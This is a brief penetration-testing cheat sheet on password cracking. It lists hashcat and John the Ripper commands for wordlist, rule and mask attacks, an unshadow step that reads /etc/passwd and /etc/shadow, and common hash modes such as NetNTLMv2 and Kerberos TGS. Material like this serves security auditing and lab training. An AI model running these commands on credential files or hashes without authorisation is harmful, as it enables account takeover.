## Password Cracking

```bash
hashcat -a 0 -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack 8 char lower+digits
hashcat -a 3 -m 0 hash.txt ?l?l?l?l?d?d?d?d

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT --wordlist=rockyou.txt
john --show hash.txt

unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# Common hash modes
# 0     MD5
# 100   SHA1
# 1400  SHA256
# 1800  sha512crypt $6$
# 3200  bcrypt
# 5500  NetNTLMv1
# 5600  NetNTLMv2
# 13100 Kerberos TGS
```

